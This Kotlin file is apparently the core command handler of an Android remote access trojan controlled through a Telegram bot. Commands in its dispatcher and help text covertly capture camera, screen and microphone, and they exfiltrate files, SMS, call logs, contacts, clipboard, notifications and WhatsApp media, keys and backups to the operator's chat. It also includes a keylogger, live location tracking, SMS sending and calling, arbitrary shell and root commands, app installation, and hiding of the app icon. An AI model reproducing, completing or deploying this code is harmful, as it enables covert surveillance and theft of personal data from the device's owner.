package com.venice.rat.core

import android.content.Context
import com.venice.rat.mod.*
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

object Bot {
    private const val PER = 8

    fun kb(rows: List<List<Pair<String, String>>>): JSONObject {
        val arr = JSONArray()
        rows.forEach { r ->
            val row = JSONArray()
            r.forEach { (t, d) -> row.put(JSONObject().put("text", t).put("callback_data", d)) }
            arr.put(row)
        }
        return JSONObject().put("inline_keyboard", arr)
    }

    suspend fun handle(ctx: Context, chat: Long, text: String, mid: Long) {
        val parts = text.trim().split(Regex("\\s+"), limit = 4)
        if (parts.isEmpty()) return
        val c = parts[0].removePrefix("/").substringBefore("@").lowercase()
        val a1 = parts.getOrNull(1) ?: ""
        val rest = parts.drop(1).joinToString(" ").trim()
        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

        suspend fun r(t: String) { Tg.send(chat, t) }

        try {
            when (c) {
                "start", "ping" -> r("<b>${Cfg.LABEL}</b> online\nRoot: ${Shell.isRoot()}\nShizuku: ${ShizukuSh.available()}\nAllFiles: ${U.isAllFiles(ctx)}\nScreen: ${Screen.ready()}\n\n/help")
                "help" -> r(HELP)
                "info" -> r(Info.device(ctx))
                "battery" -> r(Info.battery(ctx))
                "storage" -> r(Info.storage())
                "ip" -> r(U.esc(Info.ipInfo(ctx)))
                "netstat" -> r(U.esc(Info.netstat(ctx)))
                "perm" -> r(permReport(ctx))

                "cam", "camb", "cama" -> {
                    val facing = when (c) { "cam" -> 1; "camb" -> 0; else -> Prefs.lastCam(ctx) }
                    r("camera $facing ...")
                    val f = Cam.photo(ctx, facing, false)
                    if (f != null) { Tg.photo(chat, f, "facing=$facing"); f.delete() }
                    else r("camera fail (busy ho sakta hai)")
                }
                "camlist" -> r(U.esc(Cam.list(ctx)))
                "camvid" -> {
                    val s = a1.toIntOrNull() ?: 10
                    r("recording $s s...")
                    val f = Cam.video(ctx, Prefs.lastCam(ctx), s)
                    if (f != null) { Tg.video(chat, f, "camvid"); f.delete() } else r("video fail")
                }
                "flash" -> r(if (Cam.torch(ctx, true)) "on" else "fail")
                "flashoff" -> r(if (Cam.torch(ctx, false)) "off" else "fail")

                "ss" -> {
                    r("capture...")
                    val f = Screen.shot(ctx)
                    if (f != null) { Tg.photo(chat, f); f.delete() }
                    else r("consent nahi mila — app khol ke grant karo")
                }
                "srec" -> {
                    val s = a1.toIntOrNull() ?: 15
                    r("recording $s s...")
                    val f = Screen.record(ctx, s)
                    if (f != null) { Tg.video(chat, f, "srec"); f.delete() } else r("record fail")
                }
                "screenon" -> { Ctl.screenOn(ctx); r("wake") }
                "bright" -> r(if (Ctl.brightness(ctx, a1.toIntOrNull() ?: 100)) "set" else "WRITE_SETTINGS chahiye")

                "mic" -> {
                    val s = a1.toIntOrNull() ?: 10
                    r("recording $s s...")
                    val f = Mic.rec(ctx, s)
                    if (f != null) { Tg.voice(chat, f); f.delete() } else r("mic fail")
                }
                "live" -> {
                    val s = a1.toIntOrNull() ?: 60
                    if (Prefs.live(ctx)) { r("already live"); return }
                    Prefs.setLive(ctx, true)
                    r("live $s s — /stop_live")
                    scope.launch {
                        Mic.live(ctx, s) { f, i -> Tg.voice(chat, f, "chunk $i") }
                        Prefs.setLive(ctx, false)
                        Tg.send(chat, "live khatam")
                    }
                }
                "stop_live" -> { Prefs.setLive(ctx, false); r("stop signal") }
                "vol" -> r(U.esc(Mic.vol(ctx)))
                "volset" -> { Mic.setVol(ctx, a1.toIntOrNull() ?: 2, parts.getOrNull(2)?.toIntOrNull() ?: 8); r("set") }
                "mute" -> { Mic.mute(ctx, true); r("silent") }
                "unmute" -> { Mic.mute(ctx, false); r("normal") }
                "speak" -> {
                    val f = Mic.tts(ctx, rest.ifBlank { "hello" })
                    if (f != null) { Tg.voice(chat, f, "tts"); f.delete() } else r("tts fail")
                }

                "ls" -> ls(ctx, chat, a1.ifBlank { U.sd().absolutePath }, 0)
                "sdcard" -> ls(ctx, chat, U.sd().absolutePath, 0)
                "datadir" -> ls(ctx, chat, "/storage/emulated/0/Android/data", 0)
                "dirs" -> r(U.esc(Files.dirs()))
                "hidden" -> {
                    r("scan...")
                    val l = Files.hidden()
                    r(l.take(60).joinToString("\n") { U.esc(it.absolutePath) }.ifBlank { "kuch nahi mila" })
                }
                "locked" -> {
                    val l = Files.hidden().filter { it.isDirectory }.take(40)
                    r(l.joinToString("\n") { U.esc(it.absolutePath) }.ifBlank { "nahi mila" })
                }
                "search" -> {
                    if (rest.isBlank()) { r("usage: /search name"); return }
                    val l = Files.search(U.sd(), rest, 40)
                    r(l.joinToString("\n") { U.esc(it.absolutePath) }.ifBlank { "nahi mila" })
                }
                "get" -> {
                    val f = File(a1)
                    if (!f.exists()) { r("nahi mila: $a1"); return }
                    if (f.isDirectory) zipSend(ctx, chat, f)
                    else if (f.length() > 48L * 1024 * 1024) r("bada file ${U.size(f.length())}")
                    else Tg.doc(chat, f, f.name)
                }
                "zip" -> { val f = File(a1); if (f.exists()) zipSend(ctx, chat, f) else r("nahi mila") }
                "unzip" -> {
                    val z = File(a1)
                    val d = File(z.parentFile, z.nameWithoutExtension)
                    r("${Files.unzip(z, d)} files nikli -> ${U.esc(d.absolutePath)}")
                }
                "rm" -> r(if (Files.del(File(a1))) "ok" else "fail")
                "mkdir" -> r(if (Files.mk(File(a1))) "ok" else "fail")

                "sms" -> r(U.esc(Comms.sms(ctx)))
                "smssend" -> {
                    val body = parts.drop(2).joinToString(" ")
                    runCatching {
                        android.telephony.SmsManager.getDefault().sendTextMessage(a1, null, body, null, null)
                    }
                    r("sms -> $a1")
                }
                "calls" -> r(U.esc(Comms.calls(ctx)))
                "contacts" -> r(U.esc(Comms.contacts(ctx)))
                "clip" -> r(U.esc(Comms.clip(ctx)))
                "notif" -> r(U.esc(Comms.notifLog(ctx)))

                "wa" -> r(Comms.waTree(ctx))
                "wanotif" -> r(U.esc(Comms.waOnly(ctx, 100).ifBlank { "listener on karo" }))
                "wakey" -> r(U.esc(Comms.waKey()))
                "wamedia" -> {
                    r("scan...")
                    val l = Comms.waFiles(ctx).filter { it.length() > 20_000 }
                        .sortedByDescending { it.lastModified() }.take(25)
                    var n = 0
                    for (f in l) {
                        if (f.length() > 45L * 1024 * 1024) continue
                        val ok = when (f.extension.lowercase()) {
                            "jpg", "jpeg", "png", "webp" -> Tg.photo(chat, f, f.name)
                            "mp4", "3gp" -> Tg.video(chat, f, f.name)
                            else -> Tg.doc(chat, f, f.name)
                        }
                        if (ok) n++
                        if (n >= 10) break
                    }
                    r("$n files bheji")
                }
                "wadb" -> {
                    val d = File(U.sd(), "WhatsApp/Databases")
                    val l = d.listFiles()?.sortedByDescending { it.lastModified() }?.take(3) ?: emptyList()
                    if (l.isEmpty()) r("backup nahi mila")
                    else l.forEach { Tg.doc(chat, it, "encrypted backup") }
                }

                "keylog" -> r(U.esc(Comms.keyLog(ctx)))
                "keyon" -> { Prefs.setKeyOn(ctx, true); r("on") }
                "keyoff" -> { Prefs.setKeyOn(ctx, false); r("off") }

                "loc" -> r(U.esc(Loc.last(ctx)))
                "track" -> {
                    val s = a1.toIntOrNull() ?: 60
                    r("tracking $s s")
                    scope.launch {
                        Loc.track(ctx, s) { la, lo, ac ->
                            Tg.send(chat, "%.5f,%.5f acc=%.0fm\n%s".format(la, lo, ac, Loc.mapLink(la, lo)))
                        }
                        Tg.send(chat, "track khatam")
                    }
                }

                "apps" -> r(U.esc(Apps.list(ctx)))
                "user" -> r(U.esc(Apps.user(ctx)))
                "running" -> r(U.esc(Apps.running(ctx)))
                "open" -> r(if (Apps.launch(ctx, a1)) "ok" else "fail")
                "kill" -> r(if (Apps.kill(ctx, a1)) "ok" else "fail")
                "uninstall" -> { Apps.uninstall(ctx, a1); r("prompt") }
                "apk" -> {
                    val f = Apps.apkOf(ctx, a1)
                    if (f != null) Tg.doc(chat, f, "$a1.apk") else r("nahi mila")
                }
                "install" -> r(if (Apps.install(ctx, File(a1))) "installer khola" else "fail")

                "shell", "sh" -> r("<pre>${U.esc(Shell.run(rest).take(3500))}</pre>")
                "root" -> r("root=${Shell.isRoot()} shizuku=${ShizukuSh.available()}\n${U.esc(Shell.run("id"))}")
                "su" -> r("<pre>${U.esc(Shell.run(rest, true).take(3500))}</pre>")

                "vib" -> { Ctl.vibrate(ctx, 1500); r("ok") }
                "toast" -> { Ctl.toast(ctx, rest.ifBlank { "hello" }); r("ok") }
                "ring" -> r(if (Ctl.ring(ctx, a1.toIntOrNull() ?: 10)) "ringing" else "fail")
                "stopring" -> { Ctl.stopRing(); r("stopped") }
                "lock" -> r(if (Ctl.lock(ctx)) "locked" else "/admin karo")
                "admin" -> { Ctl.askAdmin(ctx); r("prompt") }
                "power" -> r(Ctl.power(ctx, false))
                "reboot" -> r(Ctl.power(ctx, true))
                "hide" -> { Prefs.setHidden(ctx, true); r("hidden"); delay(400); Ctl.hide(ctx, true) }
                "unhide" -> { Prefs.setHidden(ctx, false); Ctl.hide(ctx, false); r("visible") }
                "dial" -> { Ctl.dial(ctx, a1, false); r("dialer") }
                "call" -> { Ctl.dial(ctx, a1, true); r("calling") }
                "die" -> { r("bye"); BotService.stop(ctx) }
                else -> r("unknown /$c — /help")
            }
        } catch (e: Exception) {
            r("ERR ${U.esc(e.message ?: e.javaClass.simpleName)}")
        }
    }

    suspend fun ls(ctx: Context, chat: Long, path: String, page: Int) {
        val d = File(path)
        if (!d.exists() || !d.isDirectory) { Tg.send(chat, "dir nahi: ${U.esc(path)}"); return }
        val all = Files.ls(d)
        val pages = maxOf(1, (all.size + PER - 1) / PER)
        val pg = page.coerceIn(0, pages - 1)
        val slice = all.drop(pg * PER).take(PER)
        val key = Paths.put(d.absolutePath)
        val rows = mutableListOf<List<Pair<String, String>>>()
        slice.forEachIndexed { i, f ->
            rows.add(listOf((if (f.isDirectory) "DIR " else "FILE ") + f.name.take(26) to
                (if (f.isDirectory) "L:$key:$pg:${i + 1}" else "D:$key:$pg:$i")))
        }
        val nav = mutableListOf<Pair<String, String>>()
        d.parentFile?.let { nav.add("up" to "L:${Paths.put(it.absolutePath)}:0:0") }
        if (pg > 0) nav.add("<" to "L:$key:${pg - 1}:0")
        if (pg < pages - 1) nav.add(">" to "L:$key:${pg + 1}:0")
        if (nav.isNotEmpty()) rows.add(nav)
        rows.add(listOf("refresh" to "L:$key:$pg:0", "close" to "X"))
        Tg.send(chat, "<b>${U.esc(d.absolutePath)}</b>\n${all.size} items ${pg + 1}/$pages", kb(rows))
    }

    suspend fun onCb(ctx: Context, chat: Long, mid: Long, data: String, cbId: String) {
        Tg.cb(cbId)
        when {
            data == "X" -> Tg.del(chat, mid)
            data.startsWith("L:") || data.startsWith("D:") -> {
                val p = data.split(":")
                val path = Paths.get(p[1].toIntOrNull() ?: return) ?: return
                val page = p.getOrNull(2)?.toIntOrNull() ?: 0
                val idx = p.getOrNull(3)?.toIntOrNull() ?: 0
                val list = File(path).listFiles()?.sortedWith(
                    compareBy({ !it.isDirectory }, { it.name.lowercase() })) ?: return
                if (data.startsWith("L:")) {
                    if (idx > 0) {
                        val t = list.getOrNull(idx - 1) ?: return
                        if (t.isDirectory) ls(ctx, chat, t.absolutePath, 0) else Tg.doc(chat, t, t.name)
                    } else ls(ctx, chat, path, page)
                } else {
                    val t = list.getOrNull(page * PER + idx) ?: return
                    if (t.length() > 48L * 1024 * 1024) Tg.send(chat, "bada file")
                    else Tg.doc(chat, t, t.name)
                }
            }
        }
    }

    private suspend fun zipSend(ctx: Context, chat: Long, f: File) {
        val out = File(U.dir(ctx, "zip"), "${f.name}_${System.currentTimeMillis()}.zip")
        if (Files.zip(f, out)) {
            if (out.length() > 48L * 1024 * 1024) Tg.send(chat, "zip bada")
            else Tg.doc(chat, out, out.name)
            out.delete()
        } else Tg.send(chat, "zip fail")
    }

    fun permReport(ctx: Context): String = buildString {
        appendLine("AllFiles: ${U.isAllFiles(ctx)}")
        appendLine("Admin: ${Ctl.isAdmin(ctx)}")
        appendLine("Screen: ${Screen.ready()}")
        appendLine("Shizuku: ${ShizukuSh.available()}")
        appendLine("Root: ${Shell.isRoot()}")
    }

    const val HELP = """
<b>INFO</b> /info /battery /storage /ip /netstat /perm
<b>CAM</b> /cam /camb /cama /camvid 10 /camlist /flash /flashoff
<b>SCREEN</b> /ss /srec 15 /screenon /bright 80
<b>MIC</b> /mic 15 /live 60 /stop_live /vol /mute /unmute /speak hi
<b>FILES</b> /ls /sdcard /datadir /dirs /hidden /locked /search q /get p /zip p /unzip p /rm p /mkdir p
<b>COMMS</b> /sms /smssend num txt /calls /contacts /clip /notif
<b>WA</b> /wa /wanotif /wakey /wamedia /wadb
<b>LOG</b> /keylog /keyon /keyoff
<b>LOC</b> /loc /track 60
<b>APPS</b> /apps /user /running /open pkg /kill pkg /uninstall pkg /apk pkg /install path
<b>SHELL</b> /shell cmd /su cmd /root
<b>CTL</b> /vib /toast t /ring 10 /stopring /lock /admin /power /reboot /hide /unhide /dial n /call n /die
"""
}
